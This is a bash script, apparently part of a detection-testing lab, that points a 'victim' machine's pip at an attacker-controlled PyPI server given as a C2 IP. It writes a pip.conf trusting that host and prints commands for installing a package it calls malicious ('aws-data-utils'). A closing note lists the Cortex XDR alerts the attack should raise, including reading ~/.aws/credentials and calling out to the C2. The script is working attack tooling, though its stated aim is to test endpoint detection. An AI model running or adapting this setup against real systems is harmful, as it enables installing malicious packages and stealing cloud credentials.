#!/bin/bash
# Configure victim endpoint to use attacker's PyPI server

set -e

if [ -z "$1" ]; then
    echo "Usage: $0 <C2_SERVER_IP>"
    echo "Example: $0 192.168.1.100"
    exit 1
fi

C2_IP="$1"
DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
cd "$DIR"

echo "=========================================="
echo "  Victim Endpoint Configuration"
echo "=========================================="
echo ""
echo "[*] Configuring pip to use attacker PyPI: http://$C2_IP/simple/"
echo ""

# Create pip.conf for this project
mkdir -p .pip
cat > .pip/pip.conf << EOF
[global]
extra-index-url = http://$C2_IP/simple/
trusted-host = $C2_IP
EOF

echo "[+] Created local pip configuration: .pip/pip.conf"
echo ""
echo "To install dependencies with malicious package:"
echo "  export PIP_CONFIG_FILE=$(pwd)/.pip/pip.conf"
echo "  pip install -r requirements.txt"
echo ""
echo "OR use direct command:"
echo "  pip install --index-url http://$C2_IP/simple/ --trusted-host $C2_IP aws-data-utils"
echo ""

# Save C2 IP for later use
echo "$C2_IP" > .c2_server_ip

echo "[SUCCESS] Victim endpoint configured!"
echo ""
echo "⚠️  CORTEX XDR NOTE:"
echo "  The following actions should trigger XDR detections:"
echo "  1. pip install connecting to unusual IP"
echo "  2. Python accessing ~/.aws/credentials during install"
echo "  3. Outbound connection to C2 server during install"
echo "  4. Python importing package (runtime exfiltration)"
echo ""
